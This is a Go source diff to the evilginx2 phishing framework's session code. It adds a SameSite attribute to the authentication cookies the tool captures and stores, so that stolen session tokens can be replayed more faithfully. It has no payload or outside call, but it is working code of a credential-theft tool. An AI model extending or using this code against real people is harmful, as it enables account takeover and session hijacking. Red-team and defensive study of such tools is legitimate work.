@@ -1,6 +1,7 @@
 package core
 
 import (
+	"net/http"
 	"time"
 
 	"github.com/kgretzky/evilginx2/database"
@@ -82,7 +83,7 @@ func (s *Session) SetCustom(name string, value string) {
 	s.Custom[name] = value
 }
 
-func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
+func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time, sameSite http.SameSite) {
 	if _, ok := s.CookieTokens[domain]; !ok {
 		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
 	}
@@ -92,11 +93,27 @@ func (s *Session) AddCookieAuthToken(domain string, key string, value string, pa
 		tk.Value = value
 		tk.Path = path
 		tk.HttpOnly = http_only
+		if sameSite == http.SameSiteNoneMode {
+			tk.SameSite = "None"
+		} else if sameSite == http.SameSiteLaxMode {
+			tk.SameSite = "Lax"
+		} else if sameSite == http.SameSiteStrictMode {
+			tk.SameSite = "Strict"
+		}
 	} else {
+		ss := ""
+		if sameSite == http.SameSiteNoneMode {
+			ss = "None"
+		} else if sameSite == http.SameSiteLaxMode {
+			ss = "Lax"
+		} else if sameSite == http.SameSiteStrictMode {
+			ss = "Strict"
+		}
 		s.CookieTokens[domain][key] = &database.CookieToken{
 			Name:     key,
 			Value:    value,
 			HttpOnly: http_only,
+			SameSite: ss,
 		}
 	}
 
